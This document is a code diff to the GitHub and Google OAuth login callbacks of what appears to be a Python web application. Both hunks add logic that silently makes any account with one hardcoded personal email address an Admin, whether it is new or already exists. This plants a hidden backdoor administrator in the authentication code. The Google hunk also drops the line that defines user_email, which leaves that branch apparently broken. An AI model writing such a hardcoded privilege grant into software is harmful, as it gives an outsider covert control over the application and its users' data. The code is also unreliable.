@@ -1344,15 +1344,22 @@ async def github_callback(code: str = None, state: str = None):
         try:
             user_email = email.lower()
             db_user = db.query(User).filter(User.email == user_email).first()
-
-            if not db_user:
+            
+            if db_user:
+                # Promote to Admin if email matches
+                if user_email == "leadergr13@gmail.com" and db_user.role != "Admin":
+                    db_user.role = "Admin"
+                    db_user.status = "Active"
+                    db.commit()
+                    db.refresh(db_user)
+            else:
                 # Create new user
                 user_name = github_user.get(
                     "name") or github_user.get("login", "GitHub User")
                 db_user = User(
                     email=user_email,
                     full_name=user_name,
-                    role="User",
+                    role="Admin" if user_email == "leadergr13@gmail.com" else "User",
                     status="Active",
                     password_hash=hash_password(
                         f"oauth_github_{github_user.get('id')}"),
@@ -1447,16 +1454,22 @@ async def google_callback(code: str = None, state: str = None, error: str = None
         # Create or get user in database
         db: Session = SessionLocal()
         try:
-            user_email = email.lower()
             db_user = db.query(User).filter(User.email == user_email).first()
-
-            if not db_user:
+            
+            if db_user:
+                # Promote to Admin if email matches
+                if user_email == "leadergr13@gmail.com" and db_user.role != "Admin":
+                    db_user.role = "Admin"
+                    db_user.status = "Active"
+                    db.commit()
+                    db.refresh(db_user)
+            else:
                 # Create new user
                 user_name = google_user.get("name", "Google User")
                 db_user = User(
                     email=user_email,
                     full_name=user_name,
-                    role="User",
+                    role="Admin" if user_email == "leadergr13@gmail.com" else "User",
                     status="Active",
                     password_hash=hash_password(
                         f"oauth_google_{google_user.get('id')}"),
